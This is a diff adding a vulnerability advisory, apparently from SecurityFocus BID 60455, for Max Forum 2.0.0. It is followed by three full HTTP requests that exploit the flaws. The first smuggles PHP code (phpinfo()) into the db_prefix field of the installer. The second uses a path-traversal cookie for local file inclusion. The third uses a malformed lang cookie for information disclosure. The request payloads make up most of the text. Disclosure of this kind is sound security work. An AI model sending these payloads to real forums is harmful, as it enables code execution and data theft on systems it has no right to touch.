@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/60455/info
+
+Max Forum is prone to multiple input-validation vulnerabilities including a PHP code-execution vulnerability, a local file-include vulnerability and an information-disclosure because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to inject arbitrary PHP code and include and execute arbitrary files from the vulnerable system in the context of the affected application and to obtain sensitive information that may aid in further attacks.
+
+Max Forum 2.0.0 is vulnerable; other versions may also be affected. 
+
+PHP code-execution:
+
+POST /Max/install/install.php?step=4 HTTP/1.1
+Host: www.example
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.example/Max/install/install.php?step=3
+Cookie: exp_lang=en; language=english; max_name=admin; max_password=2d6df19ab196f1c344310e0021239a06; lang=en_US; PHPSESSID=ver2j0fvv4tb98e3cupdulrd97
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 179
+mysql_host=www.example&mysql_login=root&mysql_pass=toor&mysql_database=max&db_prefix=max_%22%3Bphpinfo%28%29%3B%2F%2F&site_address=http%3A%2F%2Fwww.example%2FMax%2F&step=4&prev_step=3
+
+Local file-include:
+
+GET /Max/install/ HTTP/1.1
+Host: www.example
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: language=../../phpinfo; lang=en_US; PHPSESSID=ver2j0fvv4tb98e3cupdulrd97
+Connection: keep-alive
+
+Information-disclosure:
+
+GET /Max/index.php?forum=2 HTTP/1.1
+Host: www.example
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: max_name=admin; max_password=dfbb72b7a33b97abda905a4af7e6c7f5; PHPSESSID=ver2j0fvv4tb98e3cupdulrd97; lang=
+Connection: keep-alive
